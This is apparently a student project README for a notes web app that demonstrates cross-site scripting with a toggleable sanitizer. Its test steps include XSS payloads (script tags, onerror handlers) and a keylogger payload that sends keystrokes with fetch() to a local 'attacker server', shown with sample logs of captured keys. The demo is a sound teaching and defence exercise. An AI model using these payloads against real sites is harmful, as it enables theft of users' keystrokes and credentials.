# Notes App - XSS Vulnerability and Defense Demo

This project demonstrates XSS (Cross-Site Scripting) vulnerabilities and defenses in a full-stack web application. It includes rich text note functionality with a toggleable HTML sanitizer and demonstrates how XSS attacks work when defenses are disabled.

## 🚀 Quick Start

### Prerequisites
- Node.js (v18 or higher)
- MongoDB (local or cloud instance)
- Modern web browser

### 1. Setup Backend
```bash
cd backend
npm install
npm run dev
```
The backend will start on `http://localhost:5000`

### 2. Setup Frontend
```bash
cd frontend
npm install
npm run dev
```
The frontend will start on `http://localhost:3000`

### 3. Start Attacker Server
```bash
# From project root
node attacker_server.js
```
The attacker server will start on `http://localhost:8888`

## 🧪 Testing the Application

### Manual Testing Steps

#### 1. **Basic Functionality Test**
1. Navigate to `http://localhost:3000`
2. Click "Create New User" and register a test account
3. Login with your credentials
4. Verify you can see the "Add New Note" button
5. Notice the **"Sanitizer: ON"** button in the header

#### 2. **Rich Text Features Test**
1. Click "Add New Note"
2. Enter HTML content like:
   ```html
   <h3>My Rich Note</h3>
   <p>This has <b>bold</b> and <i>italic</i> text!</p>
   <img src="https://via.placeholder.com/100" alt="test">
   ```
3. Save the note
4. Verify the HTML renders properly (styled text, images appear)

#### 3. **Sanitizer Defense Test (Default Behavior)**
1. Ensure "Sanitizer: ON" is displayed
2. Create a note with malicious content:
   ```html
   <h3>Innocent Looking Note</h3>
   <script>alert('XSS Attack!');</script>
   <img src="invalid" onerror="alert('Image XSS!')">
   <p>Normal content</p>
   ```
3. Save the note
4. **Expected Result:** 
   - No alerts should appear
   - The `<script>` tag should be removed
   - The `onerror` attribute should be stripped
   - Safe HTML (h3, p) should still render

#### 4. **XSS Vulnerability Test (Sanitizer Disabled)**
1. Click the "Sanitizer: ON" button to toggle it to "OFF"
2. Create a note with the same malicious content:
   ```html
   <h3>Vulnerable Note</h3>
   <img src="invalid" onerror="alert('XSS Executed!');" style="display:none;">
   <p>This note contains XSS</p>
   ```
3. Save the note
4. **Expected Result:** 
   - An alert should appear showing "XSS Executed!"
   - This demonstrates the vulnerability when sanitizer is off

#### 5. **Keylogger Attack Test**
1. Ensure sanitizer is "OFF"
2. Create a note with keylogger payload:
   ```html
   <h3>Innocent Note</h3>
   <img src="invalid" onerror="
   document.addEventListener('keydown', function(e) {
     fetch('http://localhost:8888/keylog', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({key: e.key, url: location.href})
     });
   });" style="display:none;">
   <p>This looks completely normal!</p>
   ```
3. Save the note
4. Type some keys on the page (a, b, c, etc.)
5. Check the attacker server logs:
   ```bash
   # Visit in browser or curl
   http://localhost:8888/logs
   ```
6. **Expected Result:** You should see logged keystrokes

### Automated Testing

#### Run All Tests
```bash
cd frontend
npx playwright test
```

#### Run Specific Test Categories
```bash
# Run only XSS and security tests
npx playwright test --grep "XSS and Security"

# Run only basic functionality tests
npx playwright test --grep "Complete Notes App"
```

#### Run Tests with Visual Output
```bash
npx playwright test --ui
```

#### View Test Results
```bash
npx playwright show-report
```

## 🔍 Verification Checklist

### ✅ Frontend Features
- [ ] User registration and login work
- [ ] Rich HTML content renders properly
- [ ] Sanitizer toggle button changes between ON/OFF
- [ ] CRUD operations work (Create, Read, Update, Delete notes)
- [ ] Pagination works for multiple notes

### ✅ Security Features
- [ ] **Sanitizer ON**: Dangerous tags/attributes are removed
- [ ] **Sanitizer OFF**: XSS attacks execute successfully
- [ ] Keylogger payload captures keystrokes when sanitizer is off
- [ ] Safe HTML tags (h1-h6, p, b, i, img) work in both modes

### ✅ Backend Features
- [ ] Notes API endpoints respond correctly
- [ ] User authentication works
- [ ] Notes are saved to database
- [ ] Pagination API returns correct results

### ✅ Attacker Server
- [ ] Accepts POST requests to `/keylog`
- [ ] Logs keystrokes to file and console
- [ ] `/logs` endpoint shows captured data
- [ ] CORS headers allow cross-origin requests

## 🐛 Troubleshooting

### Common Issues

**Backend won't start:**
- Check if MongoDB is running
- Verify `.env` file exists with correct database URL
- Check if port 5000 is available

**Frontend won't start:**
- Check if port 3000 is available
- Run `npm install` in frontend directory
- Clear browser cache

**Attacker server issues:**
- Check if port 8888 is available
- Verify the server is running: `netstat -an | findstr 8888`
- Check browser console for CORS errors

**XSS not working:**
- Ensure sanitizer is set to "OFF"
- Check browser security settings
- Try different XSS payloads if one doesn't work

**Keylogger not logging:**
- Verify attacker server is running
- Check network tab in browser dev tools
- Visit `http://localhost:8888/logs` directly

### Expected Log Output

**Attacker Server Console:**
```
🚨 Attacker Server running on http://localhost:8888
📝 Keylog file: D:\hw1-submission_hw4\keylog.txt
📊 View logs at: http://localhost:8888/logs

[2024-01-15T10:30:45.123Z] Received keystroke: "a" from http://localhost:3000
[2024-01-15T10:30:45.456Z] Received keystroke: "b" from http://localhost:3000
```

**Keylog File Content:**
```
[2024-01-15T10:30:45.123Z] Key: "a" | URL: http://localhost:3000
[2024-01-15T10:30:45.456Z] Key: "b" | URL: http://localhost:3000
[2024-01-15T10:30:45.789Z] Key: "c" | URL: http://localhost:3000
```

## 🏗️ Architecture

### Security Components
- **Sanitizer (`frontend/src/utils/sanitizeHtml.ts`)**: Removes dangerous HTML tags and attributes
- **Context (`frontend/src/contexts/SanitizerContext.tsx`)**: Manages sanitizer state
- **Toggle Button**: Allows switching between secure and vulnerable modes

### XSS Attack Vectors
1. **Script Injection**: `<script>` tags for JavaScript execution
2. **Event Handlers**: `onerror`, `onclick`, etc. on HTML elements
3. **Keylogger**: JavaScript that captures and exfiltrates keystrokes

### Defense Mechanisms
- HTML sanitization (when enabled)
- Input validation
- Content Security Policy headers (in production)

## 📝 Test Scenarios Summary

| Test | Sanitizer | Expected Result |
|------|-----------|----------------|
| Safe HTML | ON/OFF | Renders properly |
| `<script>` tag | ON | Removed, no execution |
| `<script>` tag | OFF | Executes JavaScript |
| `onerror` attribute | ON | Stripped, no execution |
| `onerror` attribute | OFF | Executes JavaScript |
| Keylogger payload | OFF | Captures keystrokes |

This demonstrates real-world XSS vulnerabilities and how proper sanitization prevents them.